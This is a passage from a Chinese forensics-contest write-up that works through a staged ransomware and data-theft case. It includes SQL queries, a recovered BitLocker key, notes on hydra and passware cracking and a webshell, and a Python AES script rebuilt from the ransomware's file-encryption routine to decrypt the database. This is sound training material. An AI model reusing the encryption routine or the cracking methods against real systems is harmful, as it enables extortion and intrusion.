<p>经过审计，发现一条DELETE命令就是对应一条删除记录的，对其计数<br> <img src="https://images2.imgbox.com/4e/b2/lnqVNPk7_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="15_315401048_634"></a>15. 将被篡改的数据库修复，统计全部学生信息中，身份证为31开头的，且分数大于540分的学生共有1048名</h4> 
<p>经数据比较，数据恢复出来的数据库和嫌疑人入侵电脑上保存的一份studient.sql数据内容完全相同<br> <img src="https://images2.imgbox.com/f1/7d/V2BNu8fO_o.png" alt="在这里插入图片描述"></p> 
<p>只有导出时的信息略有不同<br> <img src="https://images2.imgbox.com/ad/e3/q8nv7FHU_o.png" alt="在这里插入图片描述"></p> 
<p>这个2017年有点出戏，不知道是不是时间编码问题。<br> <img src="https://images2.imgbox.com/b9/da/um6gkFQx_o.png" alt="在这里插入图片描述"></p> 
<p>经过日志操作数据和恢复的数据进行对比，可以确定恢复的数据库为修改前的数据库，是一个真实的勒索，没有撕票。所以仅需对还原得的数据库进行操作即可。</p> 
<p>在本地起一个数据库，将sql文件导入，对其进行查询，当然也能导入数据库后导出为excel进行操作。</p> 
<p>起数据库的时候尽量找版本相近的，有些数据库是向下兼容的，有些可能不太行。</p> 
<p><img src="https://images2.imgbox.com/db/42/ipeZJ0h4_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/1a/71/fWrQJ0Kn_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/fe/8e/jJsiYqdd_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> 身份证为<span class="token number">31</span>开头的，且分数大于<span class="token number">540</span>分的学生 <span class="token keyword">FROM</span> score <span class="token keyword">where</span> idcard <span class="token operator">LIKE</span> <span class="token string">'31%'</span> <span class="token operator">AND</span> score <span class="token operator">&gt;</span> <span class="token number">540</span>
</code></pre> 
<p>王锋老师的数据库的课好好学</p> 
<h4><a id="16_12_665"></a>16. 将被篡改的数据库修复，统计全部学生信息中，有12对同名的学生。</h4> 
<p><img src="https://images2.imgbox.com/f9/18/PwYKLWBg_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/49/71/ZhK6xs4a_o.png" alt="在这里插入图片描述"></p> 
<p>1879-1867=12人，有12个重名的</p> 
<p>这样快</p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> 学生总数 <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>score<span class="token punctuation">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">DISTINCT</span> name<span class="token punctuation">)</span> 去除重名后的学生总数 <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>score<span class="token punctuation">`</span></span><span class="token punctuation">;</span>
</code></pre> 
<p>当然也可以使用excel<br> <img src="https://images2.imgbox.com/22/6d/zXkM2BsB_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/ca/23/VhscxV9K_o.png" alt="在这里插入图片描述"></p> 
<p>筛选条件设置完毕后将所有数据复制到新表，计数得1048名学生<br> <img src="https://images2.imgbox.com/18/ba/FwnJuGhs_o.png" alt="在这里插入图片描述"></p> 
<p>同样筛选同名也可以使用excel实现</p> 
<p>将名字导入新表后进行去除重复值操作<br> <img src="https://images2.imgbox.com/af/e7/3MSqQxIF_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/99/8f/cfB3y2Gl_o.png" alt="在这里插入图片描述"></p> 
<p>直接删掉12个重复值。这是用最简单直白的方法去使用excel分析，当然excel也可以使用语句来筛选，但是个人认为这样不如sql语句来的快，我对excel使用的比较熟练，个人认为大量复杂的需要筛选的数据用sql会快很多，很简单的sql语句也是sql快，毕竟用excel还要导出数据。但是一些不简单不复杂，数据量适中而自己又对excel比较熟悉的情况下，excel是非常强大的可视化工具。本人因为平时比较懒，不爱动脑子，使用大多数分析都是使用excel完成的，现在市面上凡是取证比赛类的这类的数据分析，基本上excel都可以解决，毕竟不是他的主要考点。excel真的挺好用的，大家比赛时视情况，使用自己熟悉的工具去解题。</p> 
<h5><a id="_699"></a>数据库解密</h5> 
<p>先做完计算机可知其加密方式</p> 
<p>根据后面分析，现对整个加密的数据进行解密，在其原有脚本的基础上，修改编写解密脚本。</p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad
<span class="token keyword">import</span> os
<span class="token keyword">import</span> time
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> hashlib

file_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'studient.sql.CRY'</span><span class="token punctuation">,</span><span class="token string">'db.opt.CRY'</span><span class="token punctuation">,</span><span class="token string">'score.frm.CRY'</span><span class="token punctuation">,</span><span class="token string">'score.ibd.CRY'</span><span class="token punctuation">]</span> 
<span class="token comment">#根据需要解密的文件进行选择。</span>

<span class="token keyword">def</span> <span class="token function">modify_file_inplace</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> crypto<span class="token punctuation">,</span> key<span class="token punctuation">,</span> blocksize<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r+b'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        plaintext <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>blocksize<span class="token punctuation">)</span>

        <span class="token keyword">while</span> plaintext<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span> <span class="token operator">&lt;</span> blocksize<span class="token punctuation">:</span>
                padtext <span class="token operator">=</span> pad<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">,</span> style<span class="token operator">=</span><span class="token string">'pkcs7'</span><span class="token punctuation">)</span>
                ciphertext <span class="token operator">=</span> crypto<span class="token punctuation">(</span>padtext<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                ciphertext <span class="token operator">=</span> crypto<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>

            f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>

            plaintext <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>blocksize<span class="token punctuation">)</span>


machine_id <span class="token operator">=</span> <span class="token string">'95a10a23fca34b69aa8ab9c38230fc9e'</span>
time <span class="token operator">=</span> <span class="token string">'202105081333'</span> 
<span class="token comment">#根据需要解密文件的时间戳进行填写</span>
key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">(</span>machine_id<span class="token operator">+</span>time<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">(</span>machine_id<span class="token operator">+</span>time<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>
    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> IV<span class="token operator">=</span>key<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>
        modify_file_inplace<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">,</span> key<span class="token operator">=</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">+</span><span class="token string">'.decrypt'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'decrypted.'</span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/ba/d3/BBCr2ha6_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/1e/20/NVVzTz1r_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/26/a0/Aeuth2aj_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a5/62/aDxC5NI7_o.png" alt="在这里插入图片描述"></p> 
<p>还原<br> <img src="https://images2.imgbox.com/be/84/V4kdM2ae_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_764"></a>电脑部分</h3> 
<h4><a id="17_PCe01PCsha2566EEF51A3737269D631B733AB476B236E055103115D463DAF81529556C1738199_766"></a>17. 镜像PC.e01对应的嫌疑人PC源盘sha256为6EEF51A3737269D631B733AB476B236E055103115D463DAF81529556C1738199</h4> 
<p><img src="https://images2.imgbox.com/c2/ce/4SVaUuST_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="18_PC20210502_003044YYYYMMDD_HHMMSS20190317_140327_770"></a>18. PC操作系统安装时间为2021-05-02 00:30:44（格式要求：YYYY-MM-DD HH:MM:SS，如2019-03-17 14:03:27）</h4> 
<p><img src="https://images2.imgbox.com/20/7e/qDUvYZeV_o.png" alt="在这里插入图片描述"></p> 
<p>跑一把梭的时候提示有bitlocker加密分区，先爆搜一下恢复密钥，解密后重新跑一遍取证再做下面的题，不然有些题不一定找得到，或者找出来是误导项。在文件系统里直接搜“恢复密钥”这四个字一般都能搜到，如果有修改文件名了，对磁盘用正则匹配恢复密钥的格式。<br> <img src="https://images2.imgbox.com/9c/0c/aDa2CURv_o.png" alt="在这里插入图片描述"></p> 
<p>可以对比一下解密前后，分析出来的数据会多一些，<br> <img src="https://images2.imgbox.com/ab/b8/20eoGJWt_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a4/ec/ec3UH5BE_o.png" alt="在这里插入图片描述"></p> 
<p>PC类的题可以多用用取证大师，还不错。<br> <img src="https://images2.imgbox.com/56/79/hPGwXU0F_o.png" alt="在这里插入图片描述"></p> 
<p>同样也需要先解密后重新取证。能取出更多东西。<br> <img src="https://images2.imgbox.com/1b/6d/HyKPBDzm_o.png" alt="在这里插入图片描述"></p> 
<p>仿真看可以看到Eraser已经删除过很多文件了<br> <img src="https://images2.imgbox.com/ff/fc/b4lDOqkH_o.png" alt="在这里插入图片描述"></p> 
<p>在桌面可以直接看到“货5.docx”，但是打开是乱码</p> 
<p><img src="https://images2.imgbox.com/e6/a0/UYzYww5L_o.png" alt="在这里插入图片描述"></p> 
<p>office文件本质上是一个压缩包文件，有PK头的，所以使用压缩工具打开，打开文件查看，发现后缀是docx但是实质上是个excel文件</p> 
<p><img src="https://images2.imgbox.com/98/83/PAeRh5pl_o.png" alt="在这里插入图片描述"></p> 
<p>修改后缀打开，可以正常打开，有很多数据先放着，等做到题目再仔细分析</p> 
<p><img src="https://images2.imgbox.com/78/4b/uV1GX1oF_o.png" alt="在这里插入图片描述"></p> 
<p>wps和ms的office套件都会有这个最近打开文档，看一看最近打开了哪些文档，这里我们又找到两个货，推测货的编号是连续的</p> 
<p><img src="https://images2.imgbox.com/fe/fb/LjjVinjX_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/64/3d/qgTkhFhV_o.png" alt="在这里插入图片描述"></p> 
<p>货三需要密码</p> 
<p><img src="https://images2.imgbox.com/96/5d/JSJjBPHH_o.png" alt="在这里插入图片描述"></p> 
<p>使用passware爆破</p> 
<p><img src="https://images2.imgbox.com/ba/4e/1yLUVGeu_o.png" alt="在这里插入图片描述"></p> 
<p>有独立显卡的同学记得在选项中勾选使用独立显卡，比赛时让显卡去跑爆破，cpu留出来进行任务调度，运行各类取证程序。<br> <img src="https://images2.imgbox.com/fd/aa/ktLwrcaB_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/05/fe/B3sMMZB4_o.png" alt="在这里插入图片描述"></p> 
<p>存在本地邮件软件</p> 
<p><img src="https://images2.imgbox.com/ab/0e/YAu3aOCW_o.png" alt="在这里插入图片描述"></p> 
<p>在E盘找到foxmail本体</p> 
<p><img src="https://images2.imgbox.com/4c/a2/qjn39OzJ_o.png" alt="在这里插入图片描述"></p> 
<p>打开查看，查看完取证软件里也要看，有些时候取证软件能取到一些删除的邮件和缓存。<br> <img src="https://images2.imgbox.com/3f/7e/SIPnPXT2_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/9c/e2/sVH0b4g7_o.png" alt="在这里插入图片描述"></p> 
<p>在这找到货2<br> <img src="https://images2.imgbox.com/f5/98/ctXzKBPl_o.png" alt="在这里插入图片描述"></p> 
<p>这几个文件是一般pc取证的时候需要重点关注的，建议一个一个打开来看，仿真的优势就在于很直观的体现数据，以嫌疑人的思维去操作。<br> <img src="https://images2.imgbox.com/5d/c9/354nAVNZ_o.png" alt="在这里插入图片描述"></p> 
<p>在图片处找到货6<br> <img src="https://images2.imgbox.com/a8/d2/0XEJTTql_o.png" alt="在这里插入图片描述"></p> 
<p>使用010打开，010比winhex的优点在于有很多内置模板，我们很容易可以看到最后的unknownPadding是不属于jpg的附加数据，从文件头看504B0304是个压缩包，有[Content_Types].xml字段，典型的office文档，我们将这个压缩包导出。<br> <img src="https://images2.imgbox.com/63/41/rr3rjOMT_o.png" alt="在这里插入图片描述"></p> 
<p>也是一个excel文件</p> 
<p><img src="https://images2.imgbox.com/11/a9/kwWrPHDO_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/89/8b/aj0wPmwS_o.png" alt="在这里插入图片描述"></p> 
<p>在这发现一个备份文件<br> <img src="https://images2.imgbox.com/5a/5b/rjTNJFij_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/d6/df/HXwGqijO_o.png" alt="在这里插入图片描述"></p> 
<p>实际上是一个qq的备份文件，可能会涉及到一些聊天记录，聊天文件。</p> 
<p>.bak文件应该是一个apk类型的备份，可能带apk内的一些数据<br> <img src="https://images2.imgbox.com/00/66/HbY0yhvu_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/99/99/669R1NII_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/6d/df/8ZLUq1OO_o.png" alt="在这里插入图片描述"></p> 
<p>这个repair文件大小刚好为102400是很整的一个数，刚好100兆，使用010分析<br> <img src="https://images2.imgbox.com/3f/b9/GiXr4i0P_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/51/6f/AfeBxMWm_o.png" alt="在这里插入图片描述"></p> 
<p>像是一个磁盘文件</p> 
<p>使用取证工具挂载解析，发现一个被删除的货4，导出以备后续分析<br> <img src="https://images2.imgbox.com/4a/53/AXrhoz4M_o.png" alt="在这里插入图片描述"></p> 
<p>这里发现一个access.log<br> <img src="https://images2.imgbox.com/9b/a7/y8v58X18_o.png" alt="在这里插入图片描述"></p> 
<p>这里有一个网站</p> 
<p><img src="https://images2.imgbox.com/4b/16/TPjzxZUC_o.png" alt="在这里插入图片描述"></p> 
<p>后续碰到再分析</p> 
<p>这里有个虚拟机，推测是之前入侵服务器用的，直接导出，使用仿真加载vmdk文件，这样能避免遇到密码再回来绕过密码，还可以直接判断服务器类型。同时放取证软件里跑一遍，对其情况有个概览。</p> 
<p>存在快照即卷影副本，可能要对两个都要分析，一般来说前面那个也很重要<br> <img src="https://images2.imgbox.com/c1/c0/TLCgRndr_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/7c/75/saM1eUmx_o.png" alt="在这里插入图片描述"></p> 
<p>这里也可以找到服务器密码<br> <img src="https://images2.imgbox.com/cb/ff/ssDQROIU_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/4c/86/cXJAe1AG_o.png" alt="在这里插入图片描述"></p> 
<p>接下来对入侵虚拟机进行分析</p> 
<p>再2444文件夹中发现疑似远控程序的控制端的程序<br> <img src="https://images2.imgbox.com/36/2a/K2djUZuV_o.png" alt="在这里插入图片描述"></p> 
<p>web.log疑似为加密软件后台接收的日志<br> <img src="https://images2.imgbox.com/ed/d8/Xdqd4phh_o.png" alt="在这里插入图片描述"></p> 
<p>xise中为入侵服务器使用的木马1.php，webshell管理工具验证了之前的猜想，是使用了webshell管理工具的，这里我也学到了看到webshell密码是xise的考虑xise这个工具<br> <img src="https://images2.imgbox.com/96/ee/77HqRCkI_o.png" alt="在这里插入图片描述"></p> 
<p>db.php数据库配置文件，<br> <img src="https://images2.imgbox.com/03/e7/FZvzGYVF_o.png" alt="在这里插入图片描述"></p> 
<p>studient.sql疑似原本的数据库score表导出文件，这是个好东西，解服务器题的关键<br> <img src="https://images2.imgbox.com/e9/55/DuihYemv_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/a9/8b/oGuRWoSQ_o.png" alt="在这里插入图片描述"></p> 
<p>发现还入侵了很多网站<br> <img src="https://images2.imgbox.com/77/c5/GNwcTehC_o.png" alt="在这里插入图片描述"></p> 
<p>还有其他几个文件，等做到再回过头来看</p> 
<p>桌面上这个key-server文件是用python的flask架构起一个网站，接收加密文件回传的key值用的<br> <img src="https://images2.imgbox.com/91/4e/KGYsfXVf_o.png" alt="在这里插入图片描述"></p> 
<p>发现linux爆破文件，但是设置了密码</p> 
<p><img src="https://images2.imgbox.com/3e/27/wVWf5VFz_o.png" alt="在这里插入图片描述"></p> 
<p>使用压缩包密码爆破工具,passware密码破解一流<br> <img src="https://images2.imgbox.com/5d/f9/krsNCoiN_o.png" alt="在这里插入图片描述"></p> 
<p>先爆破着，实际比赛时不一定要解出，综合考虑效能。</p> 
<p><img src="https://images2.imgbox.com/5f/8d/BHh3BaXE_o.png" alt="在这里插入图片描述"></p> 
<p>解了很久没接出</p> 
<p>但是换个角度来看打开记录可以看到其中的部分内容信息<br> <img src="https://images2.imgbox.com/c2/42/BfDJDSDP_o.png" alt="在这里插入图片描述"></p> 
<p>在桌面找到一个linux连接工具winscp，其中保存的连接记录就是链接被入侵主机的,说不定该程序日志中保存着首次登录明确的时间。<br> <img src="https://images2.imgbox.com/02/45/AzU3a2l3_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/20/ea/1RPq9Xbl_o.png" alt="在这里插入图片描述"></p> 
<p>发现winscp命令执行的操作是使用的putty，putty没有日志<br> <img src="https://images2.imgbox.com/ed/c2/JARDhWGb_o.png" alt="在这里插入图片描述"></p> 
<p>对检材的基本分析结束了，接下来就是做题，遇到问题解决问题。</p> 
<h4><a id="19_hydra_984"></a>19. 嫌疑人破解服务器密码使用的工具/软件名为hydra</h4> 
<p>破解服务器密码的使用的工具就是那么几种，都要熟悉。</p> 
<p>他怕我们不知道还特地留了个爆破成功的截图</p> 
<p><img src="https://images2.imgbox.com/f7/53/w0lNBjsF_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="20__PCbitlocker327954438944621852201003531718502172098219240251_995"></a>20. 嫌疑人PC中，bitlocker分区恢复秘钥为327954-438944-621852-201003-531718-502172-098219-240251</h4> 
<p><img src="https://images2.imgbox.com/aa/ae/6mygS1Hh_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/96/96/rgdgdIV3_o.png" alt="在这里插入图片描述"></p> 
<p>只有bitlocker解密了，才能取到关键信息</p> 
<h4><a id="21_6_1003"></a>21. 嫌疑人将所有学生信息拆分为6份文件</h4> 
<p>拆成了6个货，具体过程在上面分析的地方。<br> <img src="https://images2.imgbox.com/35/dc/qSsfr00N_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/8c/21/WR7l80Nt_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/3a/88/5yVMjwQO_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/dd/2a/TGGyKHld_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="22_339_1012"></a>22. 所有被拆分的学生信息文件中，有一份被删除，该文件中共有学生信息339条</h4> 
<p><img src="https://images2.imgbox.com/f4/bf/r24mr69Z_o.png" alt="在这里插入图片描述"></p> 
<p>货4是被删过的</p> 
<p><img src="https://images2.imgbox.com/76/0b/AcxHnBFm_o.png" alt="在这里插入图片描述"></p> 
<p>共有339条</p> 
<h4><a id="23_234011677qqcom_1023"></a>23. 嫌疑人邮箱地址为234011677@qq.com</h4> 
<p><img src="https://images2.imgbox.com/03/8f/cqsv15gd_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="24_QQQQ234011698_1029"></a>24. 嫌疑人曾通过QQ售卖的学生信息，买家QQ号为234011698</h4> 
<p>这里应该涉及到那个qq的备份文件<br> <img src="https://images2.imgbox.com/46/a0/2kvpVswS_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/21/be/GC2jFKCS_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="25_1php154243HHMMSS140327_1036"></a>25. 嫌疑人首次访问服务器中上传的1.php文件的时间为15:42:43（格式要求：HH:MM:SS，如14:03:27）</h4> 
<p><img src="https://images2.imgbox.com/00/14/Ccd0C954_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="26_7_1040"></a>26. 提取并分析服务器中的加密程序，该程序执行后会加密7种不同类型的文件</h4> 
<p><img src="https://images2.imgbox.com/a7/4a/xDQhSdkn_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="27_4_1044"></a>27. 嫌疑人共加密了4个文件</h4> 
<p><img src="https://images2.imgbox.com/2c/8f/92aRwHc7_o.png" alt="在这里插入图片描述"></p> 
<p>对/usr/local/mysql/var/studient目录进行了加密<br> <img src="https://images2.imgbox.com/01/ba/7oXGaJJU_o.png" alt="在这里插入图片描述"></p> 
<p>共加密四个文件</p> 
<h4><a id="28_20210508_133313YYYYMMDD_HHMMSS20190317_140327_1054"></a>28. 首次成功加密文件的时间为2021-05-08 13:33:13（格式要求：YYYY-MM-DD HH:MM:SS，如2019-03-17 14:03:27）</h4> 
<p>可以看到在留下来的历史记录里还有两条加密的操作<br> <img src="https://images2.imgbox.com/4a/53/6cmjfU03_o.png" alt="在这里插入图片描述"></p> 
<p>每执行一次操作都会向后台回传一条记录，根据加密逻辑和程序意图，应该是对文件夹加密的这一条。<br> <img src="https://images2.imgbox.com/70/0d/hmwWw3DS_o.png" alt="在这里插入图片描述"></p> 
<p>后台总共有4条记录，很明显取证软件中的两条对应后两条，前面两条的操作记录可能已经被删除了</p> 
<p>这里他问首次加密成功，需要满足加密成功和首次这两个条件，多次加密因为文件后缀已无法满足加密程序的判断逻辑，所以不会执行加密操作。</p> 
<p><img src="https://images2.imgbox.com/1b/d4/yvwzkPga_o.png" alt="在这里插入图片描述"></p> 
<p>查看文件修改时间，很明显对应202105081333这一条，所以首次加密时间为2021-05-08 13:33:13，我们就是根据该条信息制作密钥编写解密程序。</p> 
<p><img src="https://images2.imgbox.com/97/f2/SEPPKhsq_o.png" alt="在这里插入图片描述"></p> 
<p>查看具体参数，时间为2021-05-08 13:33:13.487958325 +0800</p> 
<p>通过这个地方对文件时间戳的查询，我们可以看到studient.sql的加密时间是远晚于其他几个文件的，所以对studient.sql需要使用其对应的时间戳去解密</p> 
<h4><a id="29_AES_1080"></a>29. 该程序对目标文件的加密方式为AES</h4> 
<p><img src="https://images2.imgbox.com/1d/06/fF0r8LRN_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="30_studientsql9ff79decd3d6fbb2_1084"></a>30. 该程序对文件studient.sql进行加密时，使用的秘钥为9ff79decd3d6fbb2</h4> 
<p>加密脚本就是一个完整的python文件，我们可以修改其内容，直接编写解密脚本，这就是最简单的逆向类型。各种逆向如遇到这种直接调用加密库的可以稍微调整一下，然后将加密脚本中的encrypt改成decrypt就解密了。<br> <img src="https://images2.imgbox.com/23/76/guciWSOj_o.png" alt="在这里插入图片描述"><img src="https://images2.imgbox.com/a3/ef/zJpljNQi_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python">hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">(</span>machine_id<span class="token operator">+</span>time<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>
</code></pre> 
<pre><code class="prism language-python">cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> IV<span class="token operator">=</span>key<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>studient.sql的修改时间是15：28，对应的时间戳和机器码应该是这一条<br> <img src="https://images2.imgbox.com/bc/f2/UD7ud33t_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/00/ce/ZvB6nCeo_o.png" alt="在这里插入图片描述"></p> 
<p>不要看到上面有单独的studient.sql就被他迷惑了<br> <img src="https://images2.imgbox.com/c1/95/Oid7zYPn_o.png" alt="在这里插入图片描述"></p> 
<p>他问的是密钥，而不是key的值，对于aes加密来讲，密钥还需取其前16位，我差点被他骗了。</p> 
<p>三题小数据分析，第一二题还没来得及做完。</p> 
<p>取证过程中，在其电脑中又发现了新的线索。</p> 
<h3><a id="1_1117"></a>线索1：</h3> 
<p>民警怀疑加密分区里的access.rar与另外一起入侵活动有关，可能是嫌疑人拷贝到本地的日志文件。该案中，受害网站管理员于2020年9月15日13点19分报案，称有黑客篡改了部分网站页面，并篡改了一张图片，图片文件名为：HackFindx.png，文件大小为45924 Byte</p> 
<h4><a id="31_sha256_1121"></a>31. 该压缩包的sha256值为</h4> 
<p>255dea58932a6eec318560643000c64338906c8c3c840a70377cd8ec549b9d4f<br> <img src="https://images2.imgbox.com/38/49/yUHfhTOT_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="32_60797936079794_1127"></a>32. 该日志共有6079793行（6079794）</h4> 
<p>日志比较大，用各种工具打开都比较慢，简单方法就是用个带行数计算的编辑器打开即可，现在一般的编辑器都带行数计算的，开启即可。<br> <img src="https://images2.imgbox.com/4d/31/Hb0REspl_o.png" alt="在这里插入图片描述"></p> 
<p>共有6079793行日志，最有一行是空行，个人认为不算日志</p> 
<p>打开可以看到这个工具共有6百多万条，一般的导成excel分析是实现不了的</p> 
<p>这就是一个相对较大的日志了，日志分析最有用的是LogParser或者三剑客进行分析，大家后续学习中至少熟练掌握两者中的一个。</p> 
<p>大日志先用取证工具跑一遍。这里我经过多日的苦苦搜索，找到一个还不错的软件，有30天的试用，可以查看日志整体的情况，工具相对较大，多线程也做得比较好，分析起来相对较快。</p> 
